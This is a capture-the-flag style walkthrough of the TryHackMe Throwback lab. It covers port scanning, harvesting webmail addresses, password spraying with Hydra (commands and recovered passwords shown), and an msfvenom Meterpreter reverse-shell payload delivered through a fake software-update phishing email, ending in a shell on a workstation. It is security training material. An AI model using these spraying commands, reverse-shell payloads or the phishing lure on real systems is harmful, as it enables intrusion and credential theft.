# RECON
```console
$ sudo ./pymap.py -t 10.200.11.232 -A
                                                    
@@@@@@@   @@@ @@@  @@@@@@@@@@    @@@@@@   @@@@@@@  
@@@@@@@@  @@@ @@@  @@@@@@@@@@@  @@@@@@@@  @@@@@@@@  
@@!  @@@  @@! !@@  @@! @@! @@!  @@!  @@@  @@!  @@@  
!@!  @!@  !@! @!!  !@! !@! !@!  !@!  @!@  !@!  @!@  
@!@@!@!    !@!@!   @!! !!@ @!@  @!@!@!@!  @!@@!@!   
!!@!!!      @!!!   !@!   ! !@!  !!!@!!!!  !!@!!!    
!!:         !!:    !!:     !!:  !!:  !!!  !!:       
:!:         :!:    :!:     :!:  :!:  !:!  :!:       
 ::          ::    :::     ::   ::   :::   ::       
 :           :      :      :     :   : :   :        
Author: kuroHat
Github: https://github.com/gu2rks
PORT    STATE SERVICE VERSION
143/tcp open  imap    Dovecot imapd (Ubuntu)
|_imap-capabilities: LOGIN-REFERRALS SASL-IR LOGINDISABLEDA0001 more have post-login ENABLE IDLE OK LITERAL+ capabilities listed Pre-login STARTTLS ID IMAP4rev1
| ssl-cert: Subject: commonName=ip-10-40-119-232.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-40-119-232.eu-west-1.compute.internal
| Not valid before: 2020-07-25T15:51:57
|_Not valid after:  2030-07-23T15:51:57
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a4:39:c8:4e:cb:95:d5:de:05:20:d0:ef:dc:41:4f:72 (RSA)
|   256 f5:0a:42:fa:ff:ef:78:1a:ea:19:4b:49:44:c1:c3:a8 (ECDSA)
|_  256 65:00:f2:5d:66:52:fb:30:ec:f0:1d:02:7d:31:68:ca (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

PORT    STATE SERVICE  VERSION
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
|_imap-capabilities: capabilities more have post-login AUTH=PLAINA0001 listed Pre-login LITERAL+ ENABLE OK IDLE ID IMAP4rev1 LOGIN-REFERRALS SASL-IR
| ssl-cert: Subject: commonName=ip-10-40-119-232.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-40-119-232.eu-west-1.compute.internal
| Not valid before: 2020-07-25T15:51:57
|_Not valid after:  2030-07-23T15:51:57
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Throwback Hacks - Login
|_Requested resource was src/login.php
```

## 80/tcp open  http  Apache httpd 2.4.29 ((Ubuntu))
- `src/about.php` SquirrelMail 1.5.2 [SVN]
- `src/login.php`: credential  `tbhguest:WelcomeTBH1!`
- 1 email in mail box
```
Hello Guest,

Welcome to Throwback's guest email account, this account is meant to be
used for any guests that happen to visit that need email access in their
time visiting.

Keep in mind, everything you send is NOT private and can potentially be
viewed by anyone. Please be careful what you do with this account.

Thank you,

IT Security Operations,
TBH{flag}
```
I then looks around the web app and I a **Personal Address Book** which contain Nicknames, Name, and Email. I guess this people are Throwback employee. Let's dump it here, this can be helpful for the future attack (brutforcing)
```
HumphreyW 	W Humphrey 	HumphreyW@throwback.local 	
SummersW 	Summers Winters 	SummersW@throwback.local 	
FoxxR 	Rikka Foxx 	FoxxR@throwback.local 	
noreply 	noreply noreply 	noreply@throwback.local
DaibaN 	Nana Daiba 	DaibaN@throwback.local 	
PeanutbutterM 	Mr Peanutbutter 	PeanutbutterM@throwback.local 	
PetersJ 	Jon Peters 	PetersJ@throwback.local 	
DaviesJ 	J Davies 	DaviesJ@throwback.local 	
BlaireJ 	J Blaire 	BlaireJ@throwback.local 	
GongoH 	Hugh Gongo 	GongoH@throwback.local 	
MurphyF 	Frank Murphy 	MurphyF@throwback.local 	
JeffersD 	D Jeffers 	JeffersD@throwback.local 	
HorsemanB 	BoJack Horseman 	HorsemanB@throwback.local
```
- source code
```js
if (document.domain != top.document.domain) { throw "Clickjacking security violation! Please log out immediately!"; /* this code should never execute - exception should already have been thrown since it's a security violation in this case to even try to access top.document.domain (but it's left here just to be extra safe
```
I check by using devtool `console.log(document.domain)` and `console.log(top.document.domain)` and it gives `10.200.11.232`. you can read more about `document.domain` [here](https://developer.mozilla.org/en-US/docs/Web/API/Document/domain) 

# password spraying
We already have usernames from **Personal Address Book**. This is the email we got from *noreply*
```
From: 	"noreply" <noreply@throwback.local>
Date: 	Sun, August 9, 2020 5:32 pm
To: 	tbhguest@throwback.local
```
Base on the email we got from *noreply*, we can assume that the user name is the nickname in **Personal Address Book**. so let create a user list with nicknames in it.
```
1234567
HumphreyW
SummersW
FoxxR
noreply
DaibaN
PeanutbutterM
PetersJ
DaviesJ
BlaireJ
GongoH
MurphyF
JeffersD
HorsemanB
```
before we perform password spraying attack, We should try to login with HumphreyW (`HumphreyW:securitycenter`) credential which we got from `FW01`. and BOOM it works!!!!. Now we can exclude him from our attack.

So now let use Hydra to perfrom the attack. this is the syntax for running hydra.
```
hydra -t 64 -L users.txt -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/url/to/login.php:<user_parameter>=^USER^&<pass_parameter>=^PASS^:<error message>" -v
```
we could try with rockyou.txt directly but I will try with 2 passwords that we already know, `securitycenter` and `WelcomeTBH1!`.

To get `user_parameter` and `pass_parameter`, we can either use *burp suite* to intercept our resquest or check the *source code*. Now let craft our hydra command.
```
hydra -L nickname.txt -p <password> 10.200.11.232 http-post-form '/src/redirect.php:login_username=^USER^&secretkey=^PASS^:F=incorrect' -v -t 64
```

I tried with `securitycenter` and `WelcomeTBH1!`. It did't works... I was thinking to go for rockyou.txt but I gut said that I should check THM and They might mention something about a costumized wordlist, and yes they did. So I created wordlist
```console
kali@kali:~/THM/throwback$ cat pass.txt 
Spring2020
Summer2020
Fall2020
Winter2020
Password123
TBHsec2020
Password2020
Management2020
```
now let run the attack
```console
kali@kali:~/THM/throwback$ hydra -L nickname.txt -P pass.txt 10.200.11.232 http-post-form '/src/redirect.php:login_username=^USER^&secretkey=^PASS^:F=incorrect' -v -t 64
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-03 06:36:31
[DATA] max 64 tasks per 1 server, overall 64 tasks, 96 login tries (l:12/p:8), ~2 tries per task
[DATA] attacking http-post-form://10.200.11.232:80/src/redirect.php:login_username=^USER^&secretkey=^PASS^:F=incorrect
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] Page redirected to http://10.200.11.232/src/webmail.php
[80][http-post-form] host: 10.200.11.232   login: PeanutbutterM   password: Summer2020
[STATUS] attack finished for 10.200.11.232 (waiting for children to complete tests)
[VERBOSE] Page redirected to http://10.200.11.232/src/webmail.php
[VERBOSE] Page redirected to http://10.200.11.232/src/webmail.php
[VERBOSE] Page redirected to http://10.200.11.232/src/webmail.php
[80][http-post-form] host: 10.200.11.232   login: MurphyF   password: Summer2020
[80][http-post-form] host: 10.200.11.232   login: JeffersD   password: Summer2020
[80][http-post-form] host: 10.200.11.232   login: GongoH   password: Summer2020
```
let's try to login to each account and look at their inbox. only `MurphyF` is actived.
## MurphyF account
```
Dear Frank Murphy,

Due to the recent firing of the Timekeep developer who had access to our
database, we have decided to issue a password reset. You can do so by
replacing your user account name and your new password in the following
URL:

http://timekeep.throwback.local/dev/passwordreset.php?user=murphyf&password=PASSWORD

Thank you,
IT Security.
```
seem like we can reset userser password by just viste that links. Unfortunally we do not have access to **TIME** yet. but let keep it in our [important notes](README.md)

# phishing
Let start by creating own reverse shell payload using `msfvenom` using staged Windows payload
```console
kali@kali:~/THM/throwback$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f exe -o update.exe
```
now set a msfconsole to listen for incomming shell
```
msf5 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf5 exploit(multi/handler) > set lport 443
lport => 443
msf5 exploit(multi/handler) > exploit -j
```
here is our email content.
```
Subject: Note-taking software update.
Hey everyone,


We’re releasing an update for our note-taking software. In order to keep using the software, you must perform this update prior to next Friday. Please run the attached file to this email to complete this action.


Thank you for your patience in this update.

IT support
```
now wait for one victim to see our mail and download+install it. BOOM!
```
meterpreter > sysinfo
Computer        : THROWBACK-WS01
OS              : Windows 10 (10.0 Build 19041).
Architecture    : x64
System Language : en_US
Domain          : THROWBACK
Logged On Users : 7
Meterpreter     : x86/windows
meterpreter > background 
[*] Backgrounding session 1...
msf5 exploit(multi/handler) > sessions 

Active sessions
===============

  Id  Name  Type                     Information                              Connection
  --  ----  ----                     -----------                              ----------
  1         meterpreter x86/windows  THROWBACK-WS01\BlaireJ @ THROWBACK-WS01  10.50.9.18:443 -> 10.200.11.222:49808 (10.200.11.222)
```
seem like we just gain access to WS01
